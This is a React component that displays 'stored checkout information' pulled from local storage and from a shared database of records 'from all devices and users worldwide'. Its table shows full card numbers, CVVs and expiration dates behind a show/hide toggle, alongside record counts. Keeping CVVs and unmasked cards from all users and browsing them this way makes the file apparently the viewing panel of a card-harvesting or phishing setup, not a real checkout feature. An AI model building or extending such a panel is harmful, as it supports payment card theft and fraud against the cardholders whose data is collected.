import React from 'react';
import { BarChart3, Calendar, CreditCard, Eye, EyeOff, Trash2 } from 'lucide-react';
import { getStoredCardData, clearStoredData } from '../utils/storage';
import { getCardDataFromDatabase, clearDatabaseData, CardDataRecord } from '../utils/database';
import { CreditCardData } from '../types';

export const Statistics: React.FC = () => {
  const [cardData, setCardData] = React.useState<CreditCardData[]>([]);
  const [databaseData, setDatabaseData] = React.useState<CardDataRecord[]>([]);
  const [showFullNumbers, setShowFullNumbers] = React.useState(false);
  const [dataSource, setDataSource] = React.useState<'localStorage' | 'database'>('localStorage');
  const [isLoading, setIsLoading] = React.useState(true);

  React.useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    setIsLoading(true);
    try {
      // Load localStorage data
      const localData = getStoredCardData();
      setCardData(localData);
      
      // Try to load from database
      try {
        const dbData = await getCardDataFromDatabase();
        setDatabaseData(dbData);
        
        // If we have database data, default to showing it
        if (dbData.length > 0) {
          setDataSource('database');
        }
      } catch (error) {
        console.log('Database not available, using localStorage only');
        setDatabaseData([]);
      }
      
      console.log('Loaded data:', {
        database: databaseData.length,
        localStorage: localData.length
      });
    } catch (error) {
      console.error('Error loading data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleClearData = async () => {
    if (window.confirm('Are you sure you want to delete all data? This will clear both local and database storage.')) {
      setIsLoading(true);
      try {
        // Clear database if available
        try {
          await clearDatabaseData();
        } catch (error) {
          console.log('Database clear failed or not available');
        }
        
        // Clear localStorage
        clearStoredData();
        
        // Reload data
        await loadData();
      } catch (error) {
        console.error('Error clearing data:', error);
      } finally {
        setIsLoading(false);
      }
    }
  };

  const toggleShowNumbers = () => {
    setShowFullNumbers(!showFullNumbers);
  };

  const formatDate = (date: Date | string) => {
    const d = typeof date === 'string' ? new Date(date) : date;
    return d.toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short', 
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  // Convert database records to display format
  const getDisplayData = () => {
    if (dataSource === 'database') {
      return databaseData.map(item => ({
        id: item.id,
        cardNumber: item.card_number,
        cvv: item.cvv,
        expirationDate: item.expiration_date,
        maskedCardNumber: item.masked_card_number,
        timestamp: new Date(item.created_at)
      }));
    } else {
      return cardData;
    }
  };

  const displayData = getDisplayData();
  const totalRecords = dataSource === 'database' ? databaseData.length : cardData.length;
  const todayRecords = displayData.filter(item => {
    const itemDate = new Date(item.timestamp);
    const today = new Date();
    return itemDate.toDateString() === today.toDateString();
  }).length;

  return (
    <div className="max-w-4xl mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden">
      <div className="bg-gradient-to-r from-orange-600 to-orange-500 p-6 text-white">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-2xl font-bold">Statistics</h2>
            <p className="text-orange-100">
              Stored checkout information ({dataSource === 'database' ? 'Database' : 'Local Storage'})
            </p>
          </div>
          <BarChart3 className="w-8 h-8" />
        </div>
      </div>

      <div className="p-8">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <div className="bg-orange-50 p-6 rounded-lg">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-orange-600">Total Records</p>
                <p className="text-2xl font-bold text-orange-800">{totalRecords}</p>
              </div>
              <CreditCard className="w-8 h-8 text-orange-500" />
            </div>
          </div>

          <div className="bg-orange-50 p-6 rounded-lg">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-orange-600">Last Record</p>
                <p className="text-lg font-bold text-orange-800">
                  {displayData.length > 0 ? formatDate(displayData[0].timestamp).split(' ')[0] : 'N/A'}
                </p>
              </div>
              <Calendar className="w-8 h-8 text-orange-500" />
            </div>
          </div>

          <div className="bg-orange-50 p-6 rounded-lg">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm font-medium text-orange-600">Today's Records</p>
                <p className="text-2xl font-bold text-orange-800">{todayRecords}</p>
              </div>
              <BarChart3 className="w-8 h-8 text-orange-500" />
            </div>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row justify-between items-center mb-6 gap-4">
          <h3 className="text-xl font-bold text-gray-800">Stored Data</h3>
          <div className="flex gap-2">
            <div className="flex bg-gray-100 rounded-lg p-1">
              <button
                onClick={() => setDataSource('database')}
                className={`px-3 py-1 rounded text-sm font-medium transition-colors ${
                  dataSource === 'database'
                    ? 'bg-orange-600 text-white'
                    : 'text-gray-600 hover:text-gray-800'
                }`}
              >
                Database ({databaseData.length})
              </button>
              <button
                onClick={() => setDataSource('localStorage')}
                className={`px-3 py-1 rounded text-sm font-medium transition-colors ${
                  dataSource === 'localStorage'
                    ? 'bg-orange-600 text-white'
                    : 'text-gray-600 hover:text-gray-800'
                }`}
              >
                Local ({cardData.length})
              </button>
            </div>
            <button
              onClick={toggleShowNumbers}
              className="flex items-center px-4 py-2 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-lg transition-colors"
            >
              {showFullNumbers ? (
                <>
                  <EyeOff className="w-4 h-4 mr-2" />
                  Hide
                </>
              ) : (
                <>
                  <Eye className="w-4 h-4 mr-2" />
                  Show
                </>
              )}
            </button>
            <button
              onClick={handleClearData}
              className="flex items-center px-4 py-2 bg-red-100 hover:bg-red-200 text-red-700 rounded-lg transition-colors"
            >
              <Trash2 className="w-4 h-4 mr-2" />
              Clear
            </button>
          </div>
        </div>

        {isLoading ? (
          <div className="text-center py-12">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-orange-600 mx-auto mb-4"></div>
            <h3 className="text-lg font-medium text-gray-500 mb-2">Loading data...</h3>
            <p className="text-gray-400">Please wait while we fetch the records</p>
          </div>
        ) : displayData.length === 0 ? (
          <div className="text-center py-12">
            <CreditCard className="w-12 h-12 text-gray-400 mx-auto mb-4" />
            <h3 className="text-lg font-medium text-gray-500 mb-2">No stored data</h3>
            <p className="text-gray-400">
              Checkout data will appear here from {dataSource === 'database' ? 'all devices' : 'this device only'}
            </p>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full border-collapse">
              <thead>
                <tr className="bg-gray-50">
                  <th className="text-left p-4 border-b font-medium text-gray-700">Card Number</th>
                  <th className="text-left p-4 border-b font-medium text-gray-700">CVV</th>
                  <th className="text-left p-4 border-b font-medium text-gray-700">Expiration</th>
                  <th className="text-left p-4 border-b font-medium text-gray-700">Date</th>
                </tr>
              </thead>
              <tbody>
                {displayData.map((item) => (
                  <tr key={item.id} className="hover:bg-gray-50 transition-colors">
                    <td className="p-4 border-b">
                      <div className="font-mono text-sm">
                        {showFullNumbers ? item.cardNumber : item.maskedCardNumber}
                      </div>
                    </td>
                    <td className="p-4 border-b">
                      <div className="font-mono text-sm">
                        {showFullNumbers ? item.cvv : '***'}
                      </div>
                    </td>
                    <td className="p-4 border-b">
                      <div className="font-mono text-sm">
                        {showFullNumbers ? item.expirationDate : '**/**'}
                      </div>
                    </td>
                    <td className="p-4 border-b text-sm text-gray-600">
                      {formatDate(item.timestamp)}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
        
        {!isLoading && (
          <div className="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
            <div className="flex items-start">
              <div className="w-5 h-5 text-blue-600 mt-0.5 mr-3">
                ℹ️
              </div>
              <div>
                <h4 className="font-medium text-blue-800 mb-1">Data Storage Information</h4>
                <p className="text-sm text-blue-700">
                  <strong>Database:</strong> Data from all devices and users worldwide ({databaseData.length} records)<br/>
                  <strong>Local Storage:</strong> Data only from this browser/device ({cardData.length} records)
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};